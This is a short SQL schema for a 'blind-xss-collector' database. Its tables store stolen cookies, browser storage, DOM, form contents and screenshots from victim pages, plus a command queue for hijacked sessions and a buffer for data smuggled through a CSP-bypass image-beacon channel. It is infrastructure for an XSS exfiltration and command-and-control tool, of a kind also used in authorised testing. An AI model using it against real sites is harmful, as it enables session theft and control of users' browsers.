-- blind-xss-collector — D1 (SQLite) schema
CREATE TABLE IF NOT EXISTS sessions (
  sid        TEXT PRIMARY KEY,
  token      TEXT,
  first_seen INTEGER,
  last_seen  INTEGER,
  url        TEXT,
  ua         TEXT,
  ip         TEXT
);
CREATE TABLE IF NOT EXISTS reports (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  sid        TEXT,
  token      TEXT,
  ts         INTEGER,
  url        TEXT,
  referrer   TEXT,
  title      TEXT,
  origin     TEXT,
  ip         TEXT,
  ua         TEXT,
  cookies    TEXT,
  storage    TEXT,
  dom        TEXT,
  forms      TEXT,
  meta       TEXT,
  screenshot TEXT
);
CREATE TABLE IF NOT EXISTS commands (
  id      INTEGER PRIMARY KEY AUTOINCREMENT,
  sid     TEXT,
  cmd     TEXT,
  status  TEXT DEFAULT 'pending',   -- pending | sent | done
  result  TEXT,
  created INTEGER,
  done    INTEGER
);
-- reassembly buffer for the CSP-bypass image-beacon channel
CREATE TABLE IF NOT EXISTS chunks (
  sid   TEXT,
  field TEXT,
  idx   INTEGER,
  total INTEGER,
  data  TEXT,
  ts    INTEGER,
  PRIMARY KEY (sid, field, idx)
);
CREATE INDEX IF NOT EXISTS idx_reports_token ON reports(token);
CREATE INDEX IF NOT EXISTS idx_reports_sid   ON reports(sid);
CREATE INDEX IF NOT EXISTS idx_cmd_sid        ON commands(sid, status);
